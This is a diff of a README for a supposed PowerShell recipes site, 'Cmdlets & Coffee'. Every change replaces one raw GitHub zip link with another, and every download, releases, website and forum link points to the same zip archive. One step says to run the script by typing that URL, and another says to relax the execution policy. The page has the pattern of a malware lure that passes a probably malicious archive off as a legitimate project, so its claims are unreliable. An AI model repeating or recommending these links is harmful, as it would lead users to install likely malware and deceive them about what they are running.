@@ -1,7 +1,7 @@
-# ☕ https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip - Your Guide to PowerShell Recipes
+# ☕ https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip - Your Guide to PowerShell Recipes
 
 ## 📦 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip%20Latest%https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip)](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip)
+[![Download Latest Release](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip%20Latest%https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip)](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the official source code for the Cmdlets & Coffee website and blog. Here you will find helpful PowerShell scripts to enhance your work and make automation easier. 
@@ -17,7 +17,7 @@ To run the Cmdlets & Coffee scripts, you will need:
 - PowerShell installed on your machine. PowerShell comes pre-installed on Windows. You can download it for macOS and Linux from the official Microsoft site.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip) to find the latest version of our scripts.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip) to find the latest version of our scripts.
    
 2. **Choose Your File**: Look for the file that best matches your system. We provide various formats for your convenience. 
 
@@ -38,7 +38,7 @@ To run the Cmdlets & Coffee scripts, you will need:
      ```
    - Execute the script by typing:
      ```
-     https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip
+     https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip
      ```
    - Note: You may need to adjust your PowerShell execution policy. If you see a message saying you cannot run scripts, type the following command to allow running scripts:
      ```
@@ -66,8 +66,8 @@ The scripts are open source under the MIT License. This means you can use, modif
 For further inquiries or support, feel free to contact us through our website or reach out via GitHub issues. We are here to help you make the most of your PowerShell experience.
 
 ## 🔗 Quick Links
-- [Download Latest Release](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip)
-- [Cmdlets & Coffee Website](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip)
-- [Community Forum](https://raw.githubusercontent.com/A4kLahmacun/cmdletsandcoffee.github.io/main/histogeny/cmdletsandcoffee.github.io.zip)
+- [Download Latest Release](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip)
+- [Cmdlets & Coffee Website](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip)
+- [Community Forum](https://github.com/A4kLahmacun/cmdletsandcoffee.github.io/raw/refs/heads/main/src/layouts/cmdletsandcoffee-io-github-v3.7.zip)
 
 Thank you for visiting Cmdlets & Coffee! Enjoy your automation journey.
